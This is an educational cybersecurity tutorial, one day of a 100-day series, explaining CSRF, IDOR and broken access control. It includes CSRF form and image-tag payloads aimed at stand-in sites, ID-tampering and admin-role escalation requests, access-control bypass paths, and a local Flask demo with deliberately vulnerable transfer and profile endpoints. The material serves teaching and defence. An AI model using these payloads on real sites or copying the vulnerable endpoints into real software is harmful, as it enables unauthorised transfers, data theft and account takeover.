# Day 028 - CSRF, IDOR, and Broken Access Control

> **Challenge:** 100 Days of Cybersecurity | **Phase:** Offensive Security | **Difficulty:** Intermediate

---

## 🧠 The Concept

Yesterday we injected JavaScript into pages.

Today we abuse trust - the trust a website has in a logged-in user's browser, and the trust an application places in users to only access their own data.

Three vulnerabilities. All in the OWASP Top 10. All exploitable without touching the server directly.

- **CSRF** - tricks the victim's browser into making requests they didn't intend
- **IDOR** - tricks the server into returning data that belongs to someone else
- **Broken Access Control** - the server simply doesn't check if you're allowed

---

## 🔄 CSRF - Cross-Site Request Forgery

### How It Works

When you're logged into a website, your browser automatically sends your session cookie with every request to that site.

CSRF exploits this.

An attacker crafts a request to the target site and tricks your browser into sending it - with your cookies attached - from a different website.

```
Victim is logged into bank.com
Attacker sends victim a link to evil.com

evil.com contains:
<form action="https://bank.com/transfer" method="POST">
  <input type="hidden" name="amount" value="5000">
  <input type="hidden" name="to" value="attacker_account">
</form>
<script>document.forms[0].submit()</script>

Victim visits evil.com.
Form auto-submits.
Browser sends the request to bank.com - WITH victim's session cookie.
Bank sees a legitimate authenticated request.
Transfer goes through.
```

The victim never clicked anything. They just visited a page.

---

### CSRF Attack Variants

**GET-based CSRF (simplest):**
```html
<!-- If the action uses GET - a single image tag is enough -->
<img src="https://bank.com/transfer?amount=5000&to=attacker">

<!-- Victim visits attacker's page → image loads → request fires -->
```

**POST-based CSRF:**
```html
<form id="csrf" action="https://target.com/change-email" method="POST">
  <input type="hidden" name="email" value="attacker@evil.com">
</form>
<script>document.getElementById('csrf').submit()</script>
```

**JSON CSRF (when Content-Type: application/json required):**
```html
<!-- Some APIs accept text/plain too - exploit that -->
<form action="https://api.target.com/update" method="POST"
      enctype="text/plain">
  <input name='{"email":"attacker@evil.com","ignore":"' value='"}'>
</form>
```

---

### CSRF Prevention

| Method | How It Works |
|--------|-------------|
| CSRF Token | Random secret in every form - attacker can't guess it |
| SameSite Cookie | `SameSite=Strict` - cookie not sent on cross-site requests |
| Double Submit Cookie | Token in both cookie and request parameter - must match |
| Referer/Origin Check | Verify request came from the same site |
| Custom Header | `X-Requested-With: XMLHttpRequest` - simple requests can't set custom headers |

**CSRF Token example:**
```html
<form action="/transfer" method="POST">
  <input type="hidden" name="csrf_token" value="a9f3c2e1b7d4...">
  <input name="amount" value="100">
  <button>Transfer</button>
</form>
```

Attacker on evil.com can't read your csrf_token (same-origin policy blocks it).
Without the token - the server rejects the request.

---

## 🔢 IDOR - Insecure Direct Object Reference

### How It Works

An application uses a user-controlled identifier to access a resource - without checking if the requesting user is authorised to access that specific resource.

```
Your invoice: GET /api/invoices/1042
              → returns YOUR invoice data

Change the number: GET /api/invoices/1041
                   → returns SOMEONE ELSE's invoice

No authentication bypass needed.
No exploit needed.
Just change a number.
```

---

### Finding IDOR

Look for any parameter that references an object:

```
Numeric IDs:        /users/1337, /orders/5001, /messages/42
UUIDs:              /files/3f2504e0-4f89-11d3-9a0c-0305e82c3301
Usernames:          /profile/john_smith
Filenames:          /download?file=report_2024.pdf
Encoded values:     /data?id=dXNlcjoxMzM3  (base64 of "user:1337")
```

**Test each one:**
1. Note your own identifier
2. Change it to another value (increment, decrement, use another account's ID)
3. Check if you receive data you shouldn't

**Common IDOR locations:**
```
GET  /api/users/{id}           → profile data
GET  /api/orders/{id}          → order details
GET  /api/messages/{id}        → private messages
POST /api/orders/{id}/cancel   → cancel someone else's order
PUT  /api/users/{id}           → modify someone else's profile
GET  /download?file={filename} → download arbitrary files
```

---

### IDOR Escalation - Vertical

Sometimes IDOR leads to privilege escalation, not just data access.

```
Normal user update:
PUT /api/users/1337
{"name": "Alice", "email": "alice@email.com"}

Add role field:
PUT /api/users/1337
{"name": "Alice", "email": "alice@email.com", "role": "admin"}

If the server accepts this → you just made yourself an admin.
```

---

### IDOR with Encoded/Hashed IDs

Sometimes IDs are base64 or hashed - don't stop there.

```bash
# Decode base64 IDs
echo "dXNlcjoxMDQy" | base64 -d
# user:1042

# Change to another user
echo -n "user:1041" | base64
# dXNlcjoxMDQx

# Try the new encoded ID
GET /api/resource/dXNlcjoxMDQx
```

Hashed IDs (MD5/SHA1) are also predictable if the input is guessable (sequential numbers).

---

## 🚪 Broken Access Control

The broader category that IDOR belongs to - and the #1 vulnerability in OWASP Top 10 2021.

### Common Patterns

**Missing function-level access control:**
```
Admin panel: /admin/users
→ Login check: YES
→ Admin role check: NO

Any logged-in user who knows the URL gets full admin access.
```

**Horizontal privilege escalation:**
```
GET /api/account/settings     → your settings
GET /api/account/settings?userId=1337  → someone else's settings
```

**Forced browsing:**
```
After logging out → navigate back to /dashboard
If accessible without re-authentication → broken session management
```

**Method override:**
```
GET /api/users/1337          → 403 Forbidden (read blocked)
DELETE /api/users/1337       → 200 OK (delete not blocked)

# Or via header override
POST /api/users/1337
X-HTTP-Method-Override: DELETE
```

**Path traversal in access control:**
```
/admin/dashboard → blocked
/ADMIN/dashboard → allowed (case-insensitive bypass)
/admin/./dashboard → allowed (path normalisation bypass)
/api/v1/admin/dashboard → blocked
/api/v2/admin/dashboard → allowed (new version, rules not applied)
```

---

## 💻 The Code - CSRF + IDOR Demo

```python
"""
Day 028 - CSRF and IDOR Demo
100 Days of Cybersecurity by Sudeep Ravichandran

Demonstrates CSRF and IDOR vulnerabilities alongside
secure implementations.

Run: python3 csrf_idor_demo.py
Requires: pip install flask
Visit: http://127.0.0.1:5000
"""

from flask import Flask, request, jsonify, session
import secrets

app = Flask(__name__)
app.secret_key = secrets.token_hex(16)

# Mock database
USERS = {
    1: {"username": "alice", "email": "alice@example.com", "balance": 1000},
    2: {"username": "bob",   "email": "bob@example.com",   "balance": 500},
    3: {"username": "carol", "email": "carol@example.com", "balance": 2500},
}

CSRF_TOKENS = {}


# ── Auth helpers ──────────────────────────────────────────────

@app.route("/login", methods=["POST"])
def login():
    user_id = int(request.json.get("user_id", 1))
    if user_id in USERS:
        session["user_id"] = user_id
        token = secrets.token_hex(32)
        CSRF_TOKENS[user_id] = token
        return jsonify({
            "status": "logged in",
            "user": USERS[user_id]["username"],
            "csrf_token": token
        })
    return jsonify({"status": "failed"}), 401


# ── IDOR - Vulnerable ─────────────────────────────────────────

@app.route("/api/users/<int:user_id>")
def get_user_vulnerable(user_id):
    """❌ No authorisation check - any logged-in user gets any profile."""
    if "user_id" not in session:
        return jsonify({"error": "Not authenticated"}), 401

    if user_id in USERS:
        return jsonify({
            "user": USERS[user_id],
            "warning": "IDOR: any user_id returns data"
        })
    return jsonify({"error": "Not found"}), 404


# ── IDOR - Secure ─────────────────────────────────────────────

@app.route("/api/users/<int:user_id>/secure")
def get_user_secure(user_id):
    """✅ Users can only access their own profile."""
    if "user_id" not in session:
        return jsonify({"error": "Not authenticated"}), 401

    # ✅ Check that the requested ID matches the logged-in user
    if session["user_id"] != user_id:
        return jsonify({"error": "Forbidden - not your profile"}), 403

    return jsonify({"user": USERS[user_id]})


# ── CSRF - Vulnerable Transfer ────────────────────────────────

@app.route("/transfer/vulnerable", methods=["POST"])
def transfer_vulnerable():
    """❌ No CSRF token - any site can trigger this with victim's cookies."""
    if "user_id" not in session:
        return jsonify({"error": "Not authenticated"}), 401

    amount = int(request.json.get("amount", 0))
    to_user = int(request.json.get("to", 0))
    from_user = session["user_id"]

    if to_user not in USERS or amount <= 0:
        return jsonify({"error": "Invalid"}), 400

    USERS[from_user]["balance"] -= amount
    USERS[to_user]["balance"] += amount

    return jsonify({
        "status": "transferred",
        "amount": amount,
        "to": USERS[to_user]["username"],
        "warning": "CSRF vulnerable - no token checked"
    })


# ── CSRF - Secure Transfer ────────────────────────────────────

@app.route("/transfer/secure", methods=["POST"])
def transfer_secure():
    """✅ CSRF token required - cross-site requests rejected."""
    if "user_id" not in session:
        return jsonify({"error": "Not authenticated"}), 401

    # ✅ Validate CSRF token
    provided_token = request.json.get("csrf_token", "")
    expected_token = CSRF_TOKENS.get(session["user_id"], "")

    if not secrets.compare_digest(provided_token, expected_token):
        return jsonify({"error": "Invalid CSRF token - request rejected"}), 403

    amount = int(request.json.get("amount", 0))
    to_user = int(request.json.get("to", 0))
    from_user = session["user_id"]

    if to_user not in USERS or amount <= 0:
        return jsonify({"error": "Invalid"}), 400

    USERS[from_user]["balance"] -= amount
    USERS[to_user]["balance"] += amount

    return jsonify({
        "status": "transferred",
        "amount": amount,
        "to": USERS[to_user]["username"]
    })


@app.route("/")
def index():
    return """
    <html><body>
    <h1>CSRF + IDOR Demo - Day 028</h1>

    <h3>Step 1: Login as Alice (user_id: 1)</h3>
    <pre>curl -s -c cookies.txt -X POST http://127.0.0.1:5000/login
  -H "Content-Type: application/json"
  -d '{"user_id": 1}'</pre>

    <h3>IDOR Test:</h3>
    <pre>
Vulnerable (returns anyone's data):
  curl -s -b cookies.txt http://127.0.0.1:5000/api/users/2

Secure (returns 403 for other users):
  curl -s -b cookies.txt http://127.0.0.1:5000/api/users/2/secure
    </pre>

    <h3>CSRF Test:</h3>
    <pre>
Vulnerable (no token needed):
  curl -s -b cookies.txt -X POST http://127.0.0.1:5000/transfer/vulnerable
  -H "Content-Type: application/json"
  -d '{"amount": 100, "to": 2}'

Secure (token required - get from login response):
  curl -s -b cookies.txt -X POST http://127.0.0.1:5000/transfer/secure
  -H "Content-Type: application/json"
  -d '{"amount": 100, "to": 2, "csrf_token": "TOKEN_FROM_LOGIN"}'
    </pre>
    </body></html>
    """


if __name__ == "__main__":
    print("=" * 50)
    print("  CSRF + IDOR Demo - Day 028")
    print("  100 Days of Cybersecurity")
    print("=" * 50)
    print("\n  Visit: http://127.0.0.1:5000 for instructions")
    app.run(debug=False)
```

**To run:**
```bash
pip install flask
python3 csrf_idor_demo.py
```

---

## 🔑 Key Takeaways

- CSRF exploits the browser's automatic cookie sending - victim's browser is weaponised
- `SameSite=Strict` on cookies is the simplest modern CSRF defence
- IDOR is about missing authorisation checks - not broken authentication
- Always verify server-side that the logged-in user owns the requested resource
- Encoded or hashed IDs aren't security - decode them and test anyway
- Broken Access Control is OWASP #1 - most findings in real pen tests come from here

---

## 📚 Resources
- [PortSwigger CSRF Labs (free)](https://portswigger.net/web-security/csrf)
- [PortSwigger IDOR Labs (free)](https://portswigger.net/web-security/access-control/idor)
- [OWASP CSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)

---

## [⬅️ Day 027](../day027/) | [➡️ Day 029](../day029/)

*Part of my [100 Days of Cybersecurity](../README.md) challenge.*